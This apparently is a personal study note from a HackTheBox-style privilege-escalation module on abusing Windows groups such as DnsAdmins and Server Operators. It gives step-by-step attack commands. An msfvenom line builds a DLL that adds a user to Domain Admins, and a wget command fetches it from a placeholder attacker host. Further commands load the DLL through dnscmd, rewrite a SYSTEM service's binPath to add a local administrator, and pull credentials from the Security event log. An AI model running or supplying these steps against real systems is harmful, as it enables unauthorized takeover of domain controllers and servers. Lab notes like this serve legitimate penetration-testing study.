- **tags:** #windows #privesc 
- ------------------
# Backup Operators
Membership of this group grants its members the `SeBackup` and `SeRestore` privileges. The [[Windows User Privileges Privilege Escalation#SeBackupPrivilege|SeBackupPrivilege]] allows us to traverse any folder and list the folder contents. This will let us copy a file from a folder, even if there is no access control entry (ACE) for us in the folder's access control list (ACL). 
# Event Log Readers
Administrators or members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255(v=ws.11)?redirectedfrom=MSDN#event-log-readers) have permission to access the Windows Event Log. If process creation events are logged we can run the following on an attempt to retrieve credentials:
```shell
wevtutil qe Security /rd:True /f:Text | findstr "\/user"
```
# DnsAdmins
Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The **Windows DNS service supports custom plugins** and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones.
## Malicious DLL Plugin
### Issue Summary
- According to Microsoft protocol specification, the **ServerLevelPluginDll** operation *enables us to load a dll of our choosing* (with no verification of dll path).
- `dnscmd.exe` already implements this option (Available to `DNSAdmins`)
- *Restarting the DNS service will load the DLL in this path*
- **The DLL simply needs to be available** on a network share that the Domain Controller’s computer account can access or the DC itself
#### External resources
[Detailed Article on how to Leverage DNSAdmins and ServerLevelPluginDLL](https://adsecurity.org/?p=4064)
### Requirements
- User member of `DnsAdmins` Domain Group
- User with the ability of restarting the DNS service

**Note:** Membership in the DnsAdmins group doesn't give the ability to restart the DNS service, but this is conceivably something that sysadmins might permit DNS admins to do.
### Steps
- Create a malicious DLL:
```bash
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" netadm /add /domain' -f dll -o useradd.dll
```
- Transfer DLL to DNS Server:
```bash
# start web server
python3 -m http.server 80

# on the DNS Server
wget "http://attackerIP:80/useradd.dll" -OutFile C:\Users\netadm\Desktop\useradd.dll
```
**Note:** You could alternatively place the DLL on a network share available to the DNS Server.
- Use `dnscmd.exe` to load the DLL onto the *ServerLevelPluginDLL*:
```shell
dnscmd /config /serverlevelplugindll C:\Users\netadm\Desktop\useradd.dll
```
- Restart the DNS Service:
```shell
# on advance we can use tools like PsService from SysInternals t check if we are indeed allowed to restart the service
# C:\Tools\PsService.exe security dns
# stop, query status, start 
sc stop dns
sc query dns
sc start dns
```
- If all went smoothly our user should now belong to the `Domain Admins` domain group
```shell
net group "Domain Admins" /dom
```
## Cleaning Up
```shell
# checking that the DLL payload is indeed in the ServerPluginDLL registry data
reg query HKLM\System\CurrentContorlSet\Services\DNS\Parameters
# deleting the ServerLevelPluginDll registry value
reg delete HKLM\System\CurrentContorlSet\Services\DNS\Parameters /v ServerLevelPluginDll
# restarting dns service
sc query dns
sc start dns
```
# Hyper-V Administrators
Hyper-V Administrators have full access to Hyper-V, which can be exploited to gain control over virtualized Domain Controllers. This includes cloning live DCs and extracting NTLM hashes from the NTDS.dit file.
# Server Operators
The *Server Operators* group allows members to *administer Windows servers without needing assignment of Domain Admin privileges*. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful [[Windows User Privileges Privilege Escalation#SeBackupPrivilege|SeBackupPrivilege]] and `SeRestorePrivilege` privileges and the **ability to control local services**.
## Exploiting Local Services
Since any member of this LocalGroup is allowed to modify local services, we can leverage our poisition by modifying the `binPath` of a service running as `NT Authority\System` such as *AppReadiness* service:
```shell
# displays service configuration
sc qc AppReadiness
# Will indeed show that member of Server Operators group have full Access
PsService.exe security AppReadiness
# Modify the service binpath to add our user to the loac admins group
sc config AppReadiness binPath= "C:\Windows\System32\cmd.exe /c net localgroup Administrators server_adm /add"
sc start WSearch
```
### Trying With Other Services
The *AppReadiness* service was the one suggested by HackTheBox in the Windows Privesc Module. However let's try doing it with any other service, for example, the *WSearch* service:
`PsService.exe` reveals that the service is indeed started by `SYSTEM` and that our user has Full Modification Access since it belongs to the Server Operators group. Now we should be fine changing the binPath value an starting the service. However the service won't start. That's because **we also need to modify the START_TYPE value to the DEMAND type.**
```shell
sc config WSearch start= "demand"
```
If we try to start our service now, we won't have any problem and the payload will get executed!